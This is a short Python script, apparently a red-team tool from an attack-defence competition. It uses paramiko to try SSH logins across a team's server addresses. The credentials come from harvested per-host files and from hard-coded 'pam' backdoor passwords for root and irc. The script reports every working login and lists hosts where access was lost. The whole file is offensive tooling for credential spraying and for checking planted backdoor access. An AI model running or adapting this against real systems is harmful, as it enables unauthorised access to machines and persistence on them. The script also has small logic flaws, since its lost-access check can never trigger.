import os
import sys
import threading
import paramiko
import time

team_ips = [
    '10.{}.2.2',
    '10.{}.2.3',
    '10.{}.2.10',
    '10.{}.1.40'
]

pam_creds = [
    {"user" : "irc", "pass" : "secretpassxd"},
    {"user" : "root", "pass" : "secretpassxd"},
]

lost_access = []

non_clutter = threading.Lock()

def login(username, password, ip):
    login_attempt = False
    ssh = paramiko.SSHClient()
    try:
        ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
        ssh.connect(ip, port=22, username=username, password=password, timeout=10)
        login_attempt = True
    except Exception as e:
        print("host: {} error: {}".format(ip, e))
    finally:
        if ssh:
            ssh.close()
    return login_attempt

def print_working(ip, username, password, pam=False):
    non_clutter.acquire()
    pam_msg = ""
    if pam:
        pam_msg += " (pam)"
    print("Host: {}{}".format(ip, pam_msg))
    print("\t Username: {}".format(username))
    print("\t Password: {}".format(password))
    non_clutter.release()

def check_host(ip, cred_file):
    is_working = True
    with open(cred_file, "r") as passwd_file:
        for creds in passwd_file:
            creds = creds.strip().split(":")
            if len(creds) == 3:
                username = creds[1]
                password = creds[2]
                if login(username, password, ip):
                    print_working(ip, username, password)
                    is_working = True
    passwd_file.close()
    for creds in pam_creds:
        if login(creds["user"], creds["pass"], ip):
            print_working(ip, creds["user"], creds["pass"], pam=True)
            is_working = True
    if not is_working:
        lost_access.append(ip)

if len(sys.argv) == 2:
    print("Started: {}".format(time.ctime()))
    threads = []
    team_num = sys.argv[1]
    team_dir = "teams/team_{}".format(team_num)
    for linux_server in team_ips:
        ip = linux_server.format(team_num)
        cred_file = team_dir + "/{}.txt".format(ip)
        if os.path.exists(cred_file):
            #check_host(ip,cred_file)
            t1 = threading.Thread(target=check_host, args=(ip,cred_file,))
            threads.append(t1)
            t1.start()
    for t in threads:
        t.join()
        threads.remove(t)
    if lost_access:
        print("Lost Access to: {}".format(",".join(lost_access)))
    print("Ended: {}".format(time.ctime()))
else:
    print("Usage: {} teamNum".format(sys.argv[0]))